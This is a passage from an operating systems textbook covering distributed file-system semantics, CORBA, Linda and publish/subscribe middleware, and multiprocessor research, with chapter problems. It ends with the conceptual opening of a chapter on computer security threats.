To a first approximation, that is the basis of the Web and how it works. Many other features have since been added to the basic Web, including style sheets, dynamic Web pages that are generated on the fly, Web pages that contain small programs or scripts that execute on the client machine, and more, but they are outside the scope of this discussion.

### 8.3.4 File-System-Based Middleware

The basic idea behind the Web is to make a distributed system look like a giant collection of hyperlinked documents. A second approach is to make a distributed system look like a great big file system. In this section we will look at some of the issues involved in designing a worldwide file system.

Using a file-system model for a distributed system means that there is a single global file system, with users all over the world able to read and write files for which they have authorization. Communication is achieved by having one process write data into a file and having other ones read them back. Many of the standard file-system issues arise here, but also some new ones related to distribution.

## Transfer Model

The first issue is the choice between the upload/download model and the remote-access model. In the former, shown in Fig. 8-33(a), a process accesses a file by first copying it from the remote server where it lives. If the file is only to be
read, the file is then read locally, for high performance. If the file is to be written, it is written locally. When the process is done with it, the updated file is put back on the server. With the remote-access model, the file stays on the server and the client sends commands there to get work done there, as shown in Fig. 8-33(b).

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-039_453_1262_448_137.jpg)

Figure 8-33. (a) The upload/download model. (b) The remote-access model.

The advantages of the upload/download model are its simplicity, and the fact that transferring entire files at once is more efficient than transferring them in small pieces. The disadvantages are that there must be enough storage for the entire file locally, moving the entire file is wasteful if only parts of it are needed, and consistency problems arise if there are multiple concurrent users.

## The Directory Hierarchy

Files are only part of the story. The other part is the directory system. All distributed file systems support directories containing multiple files. The next design issue is whether all clients have the same view of the directory hierarchy. As an example of what we mean, consider Fig. 8-34. In Fig. 8-34(a) we show two file servers, each holding three directories and some files. In Fig. 8-34(b) we have a system in which all clients (and other machines) have the same view of the distributed file system. If the path $/ D / E / x$ is valid on one machine, it is valid on all of them.

In contrast, in Fig. 8-34(c), different machines can have different views of the file system. To repeat the preceding example, the path $/ D / E / x$ might well be valid on client 1 but not on client 2. In systems that manage multiple file servers by remote mounting, Fig. 8-34(c) is the norm. It is flexible and straightforward to implement, but it has the disadvantage of not making the entire system behave like a single old-fashioned timesharing system. In a timesharing system, the file system looks the same to any process, as in the model of Fig. 8-34(b). This property makes a system easier to program and understand.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-040_1122_1159_239_188.jpg)

Figure 8-34. (a) Two file servers. The squares are directories and the circles are files. (b) A system in which all clients have the same view of the file system. (c) A system in which different clients have different views of the file system.

A closely related question is whether or not there is a global root directory, which all machines recognize as the root. One way to have a global root directory is to have the root contain one entry for each server and nothing else. Under these circumstances, paths take the form /server/path, which has its own disadvantages, but at least is the same everywhere in the system.

## Naming Transparency

The principal problem with this form of naming is that it is not fully transparent. Two forms of transparency are relevant in this context and are worth distinguishing. The first one, location transparency, means that the path name gives no hint as to where the file is located. A path like /server1/dir1/dir2/x tells everyone
that $x$ is located on server 1 , but it does not tell where that server is located. The server is free to move anywhere it wants to in the network without the path name having to be changed. Thus this system has location transparency.

However, suppose that file $x$ is extremely large and space is tight on server 1 . Furthermore, suppose that there is plenty of room on server 2. The system might well like to move $x$ to server 2 automatically. Unfortunately, when the first component of all path names is the server, the system cannot move the file to the other server automatically, even if dir1 and dir2 exist on both servers. The problem is that moving the file automatically changes its path name from /server1/dir1/dir2/x to /server2/dir1/dir2/x. Programs that have the former string built into them will cease to work if the path changes. A system in which files can be moved without their names changing is said to have location independence. A distributed system that embeds machine or server names in path names clearly is not location independent. One based on remote mounting is not, either, since it is not possible to move a file from one file group (the unit of mounting) to another and still be able to use the old path name. Location independence is not easy to achieve, but it is a desirable property to have in a distributed system.

To summarize what we said earlier, there are three common approaches to file and directory naming in a distributed system:

1. Machine + path naming, such as /machine/path or machine:path.
2. Mounting remote file systems onto the local file hierarchy.
3. A single name space that looks the same on all machines.

The first two are easy to implement, especially as a way to connect existing systems that were not designed for distributed use. The latter is difficult and requires careful design, but makes life easier for programmers and users.

## Semantics of File Sharing

When two or more users share the same file, it is necessary to define the semantics of reading and writing precisely to avoid problems. In single-processor systems the semantics normally state that when a read system call follows a write system call, the read returns the value just written, as shown in Fig. 8-35(a). Similarly, when two writes happen in quick succession, followed by a read, the value read is the value stored by the last write. In effect, the system enforces an ordering on all system calls, and all processors see the same ordering. We will refer to this model as sequential consistency.

In a distributed system, sequential consistency can be achieved easily as long as there is only one file server and clients do not cache files. All reads and writes go directly to the file server, which processes them strictly sequentially.

In practice, however, the performance of a distributed system in which all file requests must go to a single server is frequently poor. This problem is often solved

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-042_1028_1258_242_137.jpg)

Figure 8-35. (a) Sequential consistency. (b) In a distributed system with caching, reading a file may return an obsolete value.

by allowing clients to maintain local copies of heavily used files in their private caches. However, if client 1 modifies a cached file locally and shortly thereafter client 2 reads the file from the server, the second client will get an obsolete file, as illustrated in Fig. 8-35(b).

One way out of this difficulty is to propagate all changes to cached files back to the server immediately. Although conceptually simple, this approach is inefficient. An alternative solution is to relax the semantics of file sharing. Instead of requiring a read to see the effects of all previous writes, one can have a new rule that says: “Changes to an open file are initially visible only to the process that made them. Only when the file is closed are the changes visible to other processes.” The adoption of such a rule does not change what happens in Fig. 8-35(b), but it does redefine the actual behavior ( $B$ getting the original value of the file) as being the correct one. When client 1 closes the file, it sends a copy back to the server, so that subsequent reads get the new value, as required. Effectively, this is the
upload/download model shown in Fig. 8-33. This semantic rule is widely implemented and is known as session semantics.

Using session semantics raises the question of what happens if two or more clients are simultaneously caching and modifying the same file. One solution is to say that as each file is closed in turn, its value is sent back to the server, so the final result depends on who closes last. A less pleasant, but slightly easier to implement, alternative is to say that the final result is one of the candidates, but leave the choice of which one unspecified.

An alternative approach to session semantics is to use the upload/download model, but to automatically lock a file that has been downloaded. Attempts by other clients to download the file will be held up until the first client has returned it. If there is a heavy demand for a file, the server could send messages to the client holding the file, asking it to hurry up, but that may or may not help. All in all, getting the semantics of shared files right is a tricky business with no elegant and efficient solutions.

### 8.3.5 Object-Based Middleware

Now let us take a look at a third paradigm. Instead of saying that everything is a document or everything is a file, we say that everything is an object. An object is a collection of variables that are bundled together with a set of access procedures, called methods. Processes are not permitted to access the variables directly. Instead, they are required to invoke the methods.

Some programming languages, such as C++ and Java, are object oriented, but these are language-level objects rather than run-time objects. One well-known system based on run-time objects is CORBA (Common Object Request Broker Architecture) (Vinoski, 1997). CORBA is a client-server system, in which client processes on client machines can invoke operations on objects located on (possibly remote) server machines. CORBA was designed for a heterogeneous system running a variety of hardware platforms and operating systems and programmed in a variety of languages. To make it possible for a client on one platform to invoke a server on a different platform, ORBs (Object Request Brokers) are interposed between client and server to allow them to match up. The ORBs play an important role in CORBA, even providing the system with its name.

Each CORBA object is defined by an interface definition in a language called IDL (Interface Definition Language), which tells what methods the object exports and what parameter types each one expects. The IDL specification can be compiled into a client stub procedure and stored in a library. If a client process knows in advance that it will need to access a certain object, it is linked with the object’s client stub code. The IDL specification can also be compiled into a skeleton procedure that is used on the server side. If it is not known in advance which CORBA objects a process needs to use, dynamic invocation is also possible, but how that works is beyond the scope of our treatment.

When a CORBA object is created, a reference to it is also created and returned to the creating process. This reference is how the process identifies the object for subsequent invocations of its methods. The reference can be passed to other processes or stored in an object directory.

To invoke a method on an object, a client process must first acquire a reference to the object. The reference can come either directly from the creating process or, more likely, by looking it up by name or by function in some kind of directory. Once the object reference is available, the client process marshals the parameters to the method calls into a convenient structure and then contacts the client ORB. In turn, the client ORB sends a message to the server ORB, which actually invokes the method on the object. The whole mechanism is similar to RPC.

The function of the ORBs is to hide all the low-level distribution and communication details from the client and server code. In particular, the ORBs hide from the client the location of the server, whether the server is a binary program or a script, what hardware and operating system the server runs on, whether the object is currently active, and how the two ORBs communicate (e.g., TCP/IP, RPC, shared memory, etc.).

In the first version of CORBA, the protocol between the client ORB and the server ORB was not specified. As a result, every ORB vendor used a different protocol and no two of them could talk to each other. In version 2.0, the protocol was specified. For communication over the Internet, the protocol is called IIOP (Internet InterOrb Protocol).

To make it possible to use objects that were not written for CORBA with CORBA systems, every object can be equipped with an object adapter. This is a wrapper that handles chores such as registering the object, generating object references, and activating the object if it is invoked when it is not active. The arrangement of all these CORBA parts is shown in Fig. 8-36.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-044_501_1259_1439_138.jpg)

Figure 8-36. The main elements of a distributed system based on CORBA. The CORBA parts are shown in gray.

A serious problem with CORBA is that every object is located on only one server, which means the performance will be terrible for objects that are heavily used on client machines around the world. In practice, CORBA functions acceptably only in small-scale systems, such as to connect processes on one computer, one LAN, or within a single company.

### 8.3.6 Coordination-Based Middleware

Our last paradigm for a distributed system is called coordination-based middleware. We will discuss it by looking at the Linda system, an academic research project that started the whole field.

Linda is a novel system for communication and synchronization developed at Yale University by David Gelernter and his student Nick Carriero (Carriero and Gelernter, 1986; Carriero and Gelernter, 1989; and Gelernter, 1985). In Linda, independent processes communicate via an abstract tuple space. The tuple space is global to the entire system, and processes on any machine can insert tuples into the tuple space or remove tuples from the tuple space without regard to how or where they are stored. To the user, the tuple space looks like a big, global shared memory, as we have seen in various forms before, as in Fig. 8-21(c).

A tuple is like a structure in C or Java. It consists of one or more fields, each of which is a value of some type supported by the base language (Linda is implemented by adding a library to an existing language, such as C). For C-Linda, field types include integers, long integers, and floating-point numbers, as well as composite types such as arrays (including strings) and structures (but not other tuples). Unlike objects, tuples are pure data; they do not have any associated methods. Figure 8-37 shows three tuples as examples.

```
("abc", 2, 5)
("matrix-1", 1, 6, 3.14)
("family", "is-sister", "Stephany", "Roberta")
```

Figure 8-37. Three Linda tuples.
Four operations are provided on tuples. The first one, out, puts a tuple into the tuple space. For example,

```
out("abc", 2, 5);
```

puts the tuple (“abc”, 2, 5) into the tuple space. The fields of out are normally constants, variables, or expressions, as in

```
out("matrix-1", i, j, 3.14);
```

which outputs a tuple with four fields, the second and third of which are determined by the current values of the variables $i$ and $j$.

Tuples are retrieved from the tuple space by the in primitive. They are addressed by content rather than by name or address. The fields of in can be expressions or formal parameters. Consider, for example,
in(“abc”, 2, ?i);
This operation “searches” the tuple space for a tuple consisting of the string “abc”, the integer 2, and a third field containing any integer (assuming that $i$ is an integer). If found, the tuple is removed from the tuple space and the variable $i$ is assigned the value of the third field. The matching and removal are atomic, so if two processes execute the same in operation simultaneously, only one of them will succeed, unless two or more matching tuples are present. The tuple space may even contain multiple copies of the same tuple.

The matching algorithm used by in is straightforward. The fields of the in primitive, called the template, are (conceptually) compared to the corresponding fields of every tuple in the tuple space. A match occurs if the following three conditions are all met:

1. The template and the tuple have the same number of fields.
2. The types of the corresponding fields are equal.
3. Each constant or variable in the template matches its tuple field.

Formal parameters, indicated by a question mark followed by a variable name or type, do not participate in the matching (except for type checking), although those containing a variable name are assigned after a successful match.

If no matching tuple is present, the calling process is suspended until another process inserts the needed tuple, at which time the called is automatically revived and given the new tuple. The fact that processes block and unblock automatically means that if one process is about to output a tuple and another is about to input it, it does not matter which goes first. The only difference is that if the in is done before the out, there will be a slight delay until the tuple is available for removal.

The fact that processes block when a needed tuple is not present can be put to many uses. For example, it can be used to implement semaphores. To create or do an up on semaphore $S$, a process can execute

```
out("semaphore S");
```

To do a down, it does

```
in("semaphore S");
```

The state of semaphore $S$ is determined by the number of (“semaphore S”) tuples in the tuple space. If none exist, any attempt to get one will block until some other process supplies one.

In addition to out and in, Linda also has a primitive operation read, which is the same as in except that it does not remove the tuple from the tuple space. There
is also a primitive eval, which causes its parameters to be evaluated in parallel and the resulting tuple to be put in the tuple space. This mechanism can be used to perform an arbitrary computation. This is how parallel processes are created in Linda.

## Publish/Subscribe

Our next example of a coordination-based model was inspired by Linda and is called publish/subscribe (Oki et al., 1993). It consists of a number of processes connected by a broadcast network. Each process can be a producer of information, a consumer of information, or both.

When an information producer has a new piece of information (e.g., a new stock price), it broadcasts the information as a tuple on the network. This action is called publishing. Each tuple contains a hierarchical subject line containing multiple fields separated by periods. Processes that are interested in certain information can subscribe to certain subjects, including the use of wildcards in the subject line. Subscription is done by telling a tuple daemon process on the same machine that monitors published tuples what subjects to look for.

Publish/subscribe is implemented as illustrated in Fig. 8-38. When a process has a tuple to publish, it broadcasts it out onto the local LAN. The tuple daemon on each machine copies all broadcasted tuples into its RAM. It then inspects the subject line to see which processes are interested in it, forwarding a copy to each one that is. Tuples can also be broadcast over a wide area network or the Internet by having one machine on each LAN act as an information router, collecting all published tuples and then forwarding them to other LANs for rebroadcasting. This forwarding can also be done intelligently, forwarding a tuple to a remote LAN only if that remote LAN has at least one subscriber who wants the tuple. Doing this requires having the information routers exchange information about subscribers.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-047_448_1281_1429_127.jpg)

Figure 8-38. The publish/subscribe architecture.

Various kinds of semantics can be implemented, including reliable delivery and guaranteed delivery, even in the presence of crashes. In the latter case, it is
necessary to store old tuples in case they are needed later. One way to store them is to hook up a database system to the system and have it subscribe to all tuples. This can be done by wrapping the database system in an adapter, to allow an existing database to work with the publish/subscribe model. As tuples come by, the adapter captures all of them and puts them in the database.

The publish/subscribe model fully decouples producers from consumers, as does Linda. However, sometimes it is useful to know who else is out there. This information can be acquired by publishing a tuple that basically asks: “Who out there is interested in $x$ ?” Responses come back in the form of tuples that say: “I am interested in $x$.”

### 8.4 RESEARCH ON MULTIPLE PROCESSOR SYSTEMS

Few topics in operating systems research are as popular as multicores, multiprocessors, and distributed systems. Besides the direct problems of mapping operating system functionality on a system consisting of multiple processing cores, there are many open research problems related to synchronization and consistency, and the way to make such systems faster and more reliable.

Some research efforts have aimed at designing new operating systems from scratch specifically for multicore hardware. For instance, the Corey operating system addresses the performance problems caused by data structure sharing across multiple cores (Boyd-Wickizer et al., 2008). By carefully arranging kernel data structures in such a way that no sharing is needed, many of the performance bottlenecks disappear. Similarly, Barrelfish (Baumann et al., 2009) is a new operating system motivated by the rapid growth in the number of cores on the one hand, and the growth in hardware diversity on the other. It models the operating system after distributed systems with message passing instead of shared memory as the communication model. Other operating systems aim at scalability and performance. Fos (Wentzlaff et al., 2010) is an operating system that was designed to scale from the small (multicore CPUs) to the very large (clouds). Meanwhile, NewtOS (Hruby et al., 2012; and Hruby et al., 2013) is a new multiserver operating system that aims for both dependability (with a modular design and many isolated components based originally on Minix 3) and performance (which has traditionally been the weak point of such modular multiserver systems).

Multicore is not just for new designs. In Boyd-Wickizer et al. (2010), the researchers study and remove the bottlenecks they encounter when scaling Linux to a 48-core machine. They show that such systems, if designed carefully, can be made to scale quite well. Clements et al. (2013) investigate the fundamental principle that govern whether or not an API can be implemented in a scalable fashion. They show that whenever interface operations commute, a scalable implementation of that interface exists. With this knowledge, operating system designers can build more scalable operating systems.

Much systems research in recent years has also gone into making large applications scale to multicore and multiprocessor environments. One example is the scalable database engine described by Salomie et al. (2011). Again, the solution is to achieve scalability by replicating the database rather than trying to hide the parallel nature of the hardware.

Debugging parallel applications is very hard, and race conditions are hard to reproduce. Viennot et al. (2013) show how replay can help to debug software on multicore systems. Lachaize et al. provide a memory profiler for multicore systems, and Kasikci et al. (2012) present work not just on detecting race conditions in software, but even on how to tell good races from bad ones.

Finally, there is a lot of work on reducing power consumption in multiprocessors. Chen et al. (2013) propose the use of power containers to provide finegrained power and energy management.

### 8.5 SUMMARY

Computer systems can be made faster and more reliable by using multiple CPUs. Four organizations for multi-CPU systems are multiprocessors, multicomputers, virtual machines, and distributed systems. Each of these has its own properties and issues.

A multiprocessor consists of two or more CPUs that share a common RAM. Often these CPUs themselves consists of multiple cores. The cores and CPUs can be interconnected by a bus, a crossbar switch, or a multistage switching network. Various operating system configurations are possible, including giving each CPU its own operating system, having one master operating system with the rest being slaves, or having a symmetric multiprocessor, in which there is one copy of the operating system that any CPU can run. In the latter case, locks are needed to provide synchronization. When a lock is not available, a CPU can spin or do a context switch. Various scheduling algorithms are possible, including time sharing, space sharing, and gang scheduling.

Multicomputers also have two or more CPUs, but these CPUs each have their own private memory. They do not share any common RAM, so all communication uses message passing. In some cases, the network interface board has its own CPU, in which case the communication between the main CPU and the interface-board CPU has to be carefully organized to avoid race conditions. User-level communication on multicomputers often uses remote procedure calls, but distributed shared memory can also be used. Load balancing of processes is an issue here, and the various algorithms used for it include sender-initiated algorithms, receiver-initiated algorithms, and bidding algorithms.

Distributed systems are loosely coupled systems each of whose nodes is a complete computer with a complete set of peripherals and its own operating system. Often these systems are spread over a large geographical area. Middleware is
often put on top of the operating system to provide a uniform layer for applications to interact with. The various kinds include document-based, file-based, object-based, and coordination-based middleware. Some examples are the World Wide Web, CORBA, and Linda.

## PROBLEMS

1. Can the USENET newsgroup system or the [SETI@home](mailto:SETI@home) project be considered distributed systems? ([SETI@home](mailto:SETI@home) uses several million idle personal computers to analyze radio telescope data to search for extraterrestrial intelligence.) If so, how do they relate to the categories described in Fig. 8-1?
2. What happens if three CPUs in a multiprocessor attempt to access exactly the same word of memory at exactly the same instant?
3. If a CPU issues one memory request every instruction and the computer runs at 200 MIPS, about how many CPUs will it take to saturate a 400-MHz bus? Assume that a memory reference requires one bus cycle. Now repeat this problem for a system in which caching is used and the caches have a 90% hit rate. Finally, what cache hit rate would be needed to allow 32 CPUs to share the bus without overloading it?
4. Suppose that the wire between switch 2A and switch 3B in the omega network of Fig. 8-5 breaks. Who is cut off from whom?
5. How is signal handling done in the model of Fig. 8-7?
6. When a system call is made in the model of Fig. 8-8, a problem has to be solved immediately after the trap that does not occur in the model of Fig. 8-7. What is the nature of this problem and how might it be solved?
7. Rewrite the enter_region code of Fig. 2-22 using the pure read to reduce thrashing induced by the TSL instruction.
8. Multicore CPUs are beginning to appear in conventional desktop machines and laptop computers. Desktops with tens or hundreds of cores are not far off. One possible way to harness this power is to parallelize standard desktop applications such as the word processor or the web browser. Another possible way to harness the power is to parallelize the services offered by the operating system – e.g., TCP processing – and commonly-used library services – e.g., secure http library functions). Which approach appears the most promising? Why?
9. Are critical regions on code sections really necessary in an SMP operating system to avoid race conditions or will mutexes on data structures do the job as well?
10. When the TSL instruction is used for multiprocessor synchronization, the cache block containing the mutex will get shuttled back and forth between the CPU holding the lock and the CPU requesting it if both of them keep touching the block. To reduce bus traffic, the requesting CPU executes one TSL every 50 bus cycles, but the CPU holding the lock always touches the cache block between TSL instructions. If a cache block

consists of 16 32-bit words, each of which requires one bus cycle to transfer, and the bus runs at 400 MHz, what fraction of the bus bandwidth is eaten up by moving the cache block back and forth?

1. In the text, it was suggested that a binary exponential backoff algorithm be used between uses of TSL to poll a lock. It was also suggested to have a maximum delay between polls. Would the algorithm work correctly if there were no maximum delay?
2. Suppose that the TSL instruction was not available for synchronizing a multiprocessor. Instead, another instruction, SWP, was provided that atomically swapped the contents of a register with a word in memory. Could that be used to provide multiprocessor synchronization? If so, how could it be used? If not, why does it not work?
3. In this problem you are to compute how much of a bus load a spin lock puts on the bus. Imagine that each instruction executed by a CPU takes 5 nsec. After an instruction has completed, any bus cycles needed, for example, for TSL are carried out. Each bus cycle takes an additional 10 nsec above and beyond the instruction execution time. If a process is attempting to enter a critical region using a TSL loop, what fraction of the bus bandwidth does it consume? Assume that normal caching is working so that fetching an instruction inside the loop consumes no bus cycles.
4. Affinity scheduling reduces cache misses. Does it also reduce TLB misses? What about page faults?
5. For each of the topologies of Fig. 8-16, what is the diameter of the interconnection network? Count all hops (host-router and router-router) equally for this problem.
6. Consider the double-torus topology of Fig. 8-16(d) but expanded to size $k \times k$. What is the diameter of the network? (Hint: Consider odd $k$ and even $k$ differently.)
7. The bisection bandwidth of an interconnection network is often used as a measure of its capacity. It is computed by removing a minimal number of links that splits the network into two equal-size units. The capacity of the removed links is then added up. If there are many ways to make the split, the one with the minimum bandwidth is the bisection bandwidth. For an interconnection network consisting of an 8 × 8 × 8 cube, what is the bisection bandwidth if each link is 1 Gbps?
8. Consider a multicomputer in which the network interface is in user mode, so only three copies are needed from source RAM to destination RAM. Assume that moving a 32-bit word to or from the network interface board takes 20 nsec and that the network itself operates at 1 Gbps. What would the delay be for a 64-byte packet being sent from source to destination if we could ignore the copying time? What is it with the copying time? Now consider the case where two extra copies are needed, to the kernel on the sending side and from the kernel on the receiving side. What is the delay in this case?
9. Repeat the previous problem for both the three-copy case and the five-copy case, but this time compute the bandwidth rather than the delay.
10. When transferring data from RAM to a network interface, pinning a page can be used, but suppose that system calls to pin and unpin pages each take $1 \mu \mathrm{sec}$. Copying takes 5 bytes/nsec using DMA but 20 nsec per byte using programmed I/O. How big does a packet have to be before pinning the page and using DMA is worth it?
11. When a procedure is scooped up from one machine and placed on another to be called by RPC, some problems can occur. In the text, we pointed out four of these: pointers, unknown array sizes, unknown parameter types, and global variables. An issue not discussed is what happens if the (remote) procedure executes a system call. What problems might that cause and what might be done to handle them?
12. In a DSM system, when a page fault occurs, the needed page has to be located. List two possible ways to find the page.
13. Consider the processor allocation of Fig. 8-24. Suppose that process $H$ is moved from node 2 to node 3. What is the total weight of the external traffic now?
14. Some multicomputers allow running processes to be migrated from one node to another. Is it sufficient to stop a process, freeze its memory image, and just ship that off to a different node? Name two hard problems that have to be solved to make this work.
15. Why is there a limit to cable length on an Ethernet network?
16. In Fig. 8-27, the third and fourth layers are labeled Middleware and Application on all four machines. In what sense are they all the same across platforms, and in what sense are they different?
17. Figure 8-30 lists six different types of service. For each of the following applications, which service type is most appropriate?
    1. Video on demand over the Internet.
    2. Downloading a Web page.
18. DNS names have a hierarchical structure, such as sales.general-widget.com. or cs.uni.edu One way to maintain the DNS database would be as one centralized database, but that is not done because it would get too many requests/sec. Propose a way that the DNS database could be maintained in practice.
19. In the discussion of how URLs are processed by a browser, it was stated that connections are made to port 80. Why?
20. Migrating virtual machines may be easier than migrating processes, but migration can still be difficult. What problems can arise when migrating a virtual machine?
21. When a browser fetches a Web page, it first makes a TCP connection to get the text on the page (in the HTML language). Then it closes the connection and examines the page. If there are figures or icons, it then makes a separate TCP connection to fetch each one. Suggest two alternative designs to improve performance here.
22. When session semantics are used, it is always true that changes to a file are immediately visible to the process making the change and never visible to processes on other machines. However, it is an open question as to whether or not they should be immediately visible to other processes on the same machine. Give an argument each way.
23. When multiple processes need access to data, in what way is object-based access better than shared memory?
24. When a Linda in operation is done to locate a tuple, searching the entire tuple space linearly is very inefficient. Design a way to organize the tuple space that will speed up searches on all in operations.
25. Copying buffers takes time. Write a C program to find out how much time it takes on a system to which you have access. Use the clock or times functions to determine how long it takes to copy a large array. Test with different array sizes to separate copying time from overhead time.
26. Write C functions that could be used as client and server stubs to make an RPC call to the standard printf function, and a main program to test the functions. The client and server should communicate by means of a data structure that could be transmitted over a network. You may impose reasonable limits on the length of the format string and the number, types, and sizes of the variables your client stub will accept.
27. Write a program that implements the sender-initiated and receiver-initiated load balancing algorithms described in Sec. 8.2. The algorithms should take as input a list of newly created jobs specified as (creating_processor, start_time, required_CPU_time) where the creating_processor is the number of the CPU that created the job, the start_time is the time at which the job was created, and the required_CPU_time is the amount of CPU time the job needs to complete (specified in seconds). Assume a node is overloaded when it has one job and a second job is created. Assume a node is underloaded when it has no jobs. Print the number of probe messages sent by both algorithms under heavy and light workloads. Also print the maximum and minimum number of probes sent by any host and received by any host. To create the workloads, write two workload generators. The first should simulate a heavy workload, generating, on average, $N$ jobs every $A J L$ seconds, where $A J L$ is the average job length and $N$ is the number of processors. Job lengths can be a mix of long and short jobs, but the average job length must be $A J L$. The jobs should be randomly created (placed) across all processors. The second generator should simulate a light load, randomly generating N/3 jobs every AJL seconds. Play with other parameter settings for the workload generators and see how it affects the number of probe messages.
28. One of the simplest ways to implement a publish/subscribe system is via a centralized broker that receives published articles and distributes them to the appropriate subscribers. Write a multithreaded application that emulates a broker-based pub/sub system. Publisher and subscriber threads may communicate with the broker via (shared) memory. Each message should start with a length field followed by that many characters. Publishers send messages to the broker where the first line of the message contains a hierarchical subject line separated by dots followed by one or more lines that comprise the published article. Subscribers send a message to the broker with a single line containing a hierarchical interest line separated by dots expressing the articles they are interested in. The interest line may contain the wildcard symbol “*“. The broker must respond by sending all (past) articles that match the subscriber’s interest. Articles in the message are separated by the line”BEGIN NEW ARTICLE.” The subscriber should print each message it receives along with its subscriber identity (i.e., its interest line). The subscriber should continue to receive any new articles that are posted and match its interests. Publisher and subscriber threads can be created dynamically from the terminal by typing “P” or “S” (for publisher or subscriber) followed by the hierarchical subject/interest line. Publishers will then prompt for the article. Typing a single line containing “.” will signal the end of the article. (This project can also be implemented using processes communicating via TCP.)

## 9

## SECURITY

Many companies possess valuable information they want to guard closely. Among many things, this information can be technical (e.g., a new chip design or software), commercial (e.g., studies of the competition or marketing plans), financial (e.g., plans for a stock offering) or legal (e.g., documents about a potential merger or takeover). Most of this information is stored on computers. Home computers increasingly have valuable data on them, too. Many people keep their financial information, including tax returns and credit card numbers, on their computer. Love letters have gone digital. And hard disks these days are full of important photos, videos, and movies.

As more and more of this information is stored in computer systems, the need to protect it is becoming increasingly important. Guarding the information against unauthorized usage is therefore a major concern of all operating systems. Unfortunately, it is also becoming increasingly difficult due to the widespread acceptance of system bloat (and the accompanying bugs) as a normal phenomenon. In this chapter we will examine computer security as it applies to operating systems.

The issues relating to operating system security have changed radically in the past few decades. Up until the early 1990s, few people had a computer at home and most computing was done at companies, universities, and other organizations on multiuser computers ranging from large mainframes to minicomputers. Nearly all of these machines were isolated, not connected to any networks. As a consequence security was almost entirely focused on how to keep the users out of each
others’ hair. If Tracy and Camille were both registered users of the same computer the trick was to make sure that neither could read or tamper with the other’s files, yet allow them to share those files they wanted shared. Elaborate models and mechanisms were developed to make sure no user could get access rights he or she was not entitled to.

Sometimes the models and mechanisms involved classes of users rather than just individuals. For example, on a military computer, data had to be markable as top secret, secret, confidential, or public, and corporals had to be prevented from snooping in generals’ directories, no matter who the corporal was and who the general was. All these themes were thoroughly investigated, reported on, and implemented over a period of decades.

An unspoken assumption was that once a model was chosen and an implementation made, the software was basically correct and would enforce whatever the rules were. The models and software were usually pretty simple so the assumption usually held. Thus if theoretically Tracy was not permitted to look at a certain one of Camille’s files, in practice she really could not do it.

With the rise of the personal computer, tablets, smartphones and the Internet, the situation changed. For instance, many devices have only one user, so the threat of one user snooping on another user’s files mostly disappears. Of course, this is not true on shared servers (possibly in the cloud). Here, there is a lot of interest in keeping users strictly isolated. Also, snooping still happens-in the network, for example. If Tracy is on the same Wi-Fi networks as Camille, she can intercept all of her network data. Modulo the Wi-Fi, this is not a new problem. More than 2000 years ago, Julius Caesar faced the same issue. Caesar needed to send messages to his legions and allies, but there was always a chance that the message would be intercepted by his enemies. To make sure his enemies would not be able to read his commands, Caesar used encryption-replacing every letter in the message with the letter that was three positions to the left of it in the alphabet. So a “D” became an “A”, an “E” became a “B”, and so on. While today’s encryption techniques are more sophisticated, the principle is the same: without knowledge of the key, the adversary should not be able to read the message.

Unfortunately, this does not always work, because the network is not the only place where Tracy can snoop on Camille. If Tracy is able to hack into Camille’s computer, she can intercept all the outgoing messages before, and all incoming messages after they are encrypted. Breaking into someone’s computer is not always easy, but a lot easier than it should be (and typically a lot easier than cracking someone’s 2048 bit encryption key). The problem is caused by bugs in the software on Camille’s computer. Fortunately for Tracy, increasingly bloated operating systems and applications guarantee that there is no shortage of bugs. When a bug is a security bug, we call it a vulnerability. When Tracy discovers a vulnerability in Camille’s software, she has to feed that software with exactly the right bytes to trigger the bug. Bug-triggering input like this is usually called an exploit. Often, successful exploits allow attackers to take full control of the computer machine.

Phrased differently: while Camille may think she is the only user on the computer, she really is not alone at all!

Attackers may launch exploits manually or automatically, by means of a virus or a worm. The difference between a virus and worm is not always very clear. Most people agree that a virus needs at least some user interaction to propagate. For instance, the user should click on an attachment to get infected. Worms, on the other hand, are self propelled. They will propagate regardless of what the user does. It is also possible that a user willingly installs the attacker’s code herself. For instance, the attacker may repackage popular but expensive software (like a game or a word processor) and offer it for free on the Internet. For many users, “free” is irresistible. However, installing the free game automatically also installs additional functionality, the kind that hands over the PC and everything in it to a cybercriminal far away. Such software is known as a Trojan horse, a subject we will discuss shortly.

To cover all the bases, this chapter has two main parts. It starts by looking at the security landscape in detail. We will look at threats and attackers (Sec. 9.1), the nature of security and attacks (Sec. 9.2), different approaches to provide access control (Sec. 9.3), and security models (Sec. 9.4). In addition, we will look at cryptography as a core approach to help provide security (Sec. 9.5) and different ways to perform authentication (Sec. 9.6).

So far, so good. Then reality kicks in. The next four major sections are practical security problems that occur in daily life. We will talk about the tricks that attackers use to take control over a computer system, as well as counter measures to prevent this from happening. We will also discuss insider attacks and various kinds of digital pests. We conclude the chapter with a short discussion of ongoing research on computer security and finally a short summary.

Also worth noting is that while this is a book on operating systems, operating systems security and network security are so intertwined that it is really impossible to separate them. For example, viruses come in over the network but affect the operating system. On the whole, we have tended to err on the side of caution and included some material that is germane to the subject but not strictly an operating systems issue.

### 9.1 THE SECURITY ENVIRONMENT

Let us start our study of security by defining some terminology. Some people use the terms “security” and “protection” interchangeably. Nevertheless, it is frequently useful to make a distinction between the general problems involved in making sure that files are not read or modified by unauthorized persons, which include technical, administrative, legal, and political issues, on the one hand, and the specific operating system mechanisms used to provide security, on the other. To avoid confusion, we will use the term security to refer to the overall problem, and
the term protection mechanisms to refer to the specific operating system mechanisms used to safeguard information in the computer. The boundary between them is not well defined, however. First we will look at security threats and attackers to see what the nature of the problem is. Later on in the chapter we will look at the protection mechanisms and models available to help achieve security.

### 9.1.1 Threats

Many security texts decompose the security of an information system in three components: confidentiality, integrity, and availability. Together, they are often referred to as “CIA.” They are shown in Fig. 9-1 and constitute the core security properties that we must protect against attackers and eavesdroppers-such as the (other) CIA.

